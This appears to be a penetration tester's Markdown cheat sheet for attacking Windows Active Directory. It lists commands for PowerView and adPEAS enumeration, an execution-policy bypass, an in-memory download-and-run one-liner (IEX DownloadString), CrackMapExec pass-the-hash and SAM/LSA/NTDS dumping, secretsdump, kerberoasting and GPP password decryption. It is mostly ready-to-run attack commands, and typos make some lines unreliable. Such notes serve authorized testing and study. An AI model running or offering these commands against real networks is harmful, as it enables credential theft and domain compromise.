# PowerView
```powershell
# First we  need to shutdown execution policy using powershell
powershell -ep (or -ExecutionPolicy ) bypass
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
. .\ PowerView.ps1
Get-NetDomain *prints info about DC*
Get-NetDomainController *points at DC* 
Get-DomainPolicy *shows policies* 
(Get-DomainPolicy)."system access" More info about policies 
Get-NetGPO to show group Policies | selecy displayname, whenchanged
Get-ComputerInfo *Prints all info about the system*
```


# adPEAS 
https://github.com/61106960/adPEAS

start using one of the following:
```
Import-Module .\adPEAS.ps1
```
or
```
. . \adPEAS.ps1
```
or
```
gc -raw .\adPEAS.ps1 | iex
```
or
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
```

after starting adpeas we can then start enumerating 
start adPEAS with all enumeration modules and enumerate the domain the logged-on user and computer is connected to.

```
Invoke-adPEAS
```

Start adPEAS with all enumeration modules and enumerate the domain 'contoso.com'.

```
Invoke-adPEAS -Domain 'contoso.com' -Server 'dc1.contoso.com'
```

Start adPEAS with all enumeration modules, enumerate the domain 'contoso.com' and use the domain controller 'dc1.contoso.com' for almost all enumeration requests.

```
Invoke-adPEAS -Domain 'contoso.com' -Server 'dc1.contoso.com'
```

Start adPEAS with all enumeration modules, enumerate the domain 'contoso.com' and use the passed PSCredential object during enumeration.
```
$SecPassword = ConvertTo-SecureString 'Passw0rd1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('contoso\johndoe', $SecPassword)
Invoke-adPEAS -Domain 'contoso.com' -Cred $Cred
```


Start adPEAS with all enumeration modules, enumerate the domain 'contoso.com' and use the username 'contoso\johndoe' with password 'Passw0rd1!' during enumeration.

```
Invoke-adPEAS -Domain contoso.com -Username 'contoso\johndoe' -Password 'Passw0rd1!'
```

# crackmapexec 
#passhash 
```bash

crackmapexec smb <IP/CIDR or range> -u <user> -H <hash> --local-auth 

#passpassword
crackmapexec smb <IP/CIDR or range> -u <user> -d <domain> -p <pass> 

# flags
-u # USER
-p # PASSWORD
-H # Hash
-x # Execute a command 
--local-auth # login


# gather creds
--sam to dump sam hahses
--lsa dump lsa secrets
--ntds dump NTDS.dit
```


# secretsdump
dumping hashes and secrets in windows
```
secretsdump.py DOMAIN/USER:PASSWORD@IP
```

# In msfconsole 


## gpp / cPassword attack

- Check for gpp attack
```
smb_enum_gpp moudle 
```

# GetUserSPNs.py
For kerberoasting (Capture TGT account's hash)
hashcat -m 13100
```
GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request
```

# gpp-decrypt
gpp-decrypt <HASH>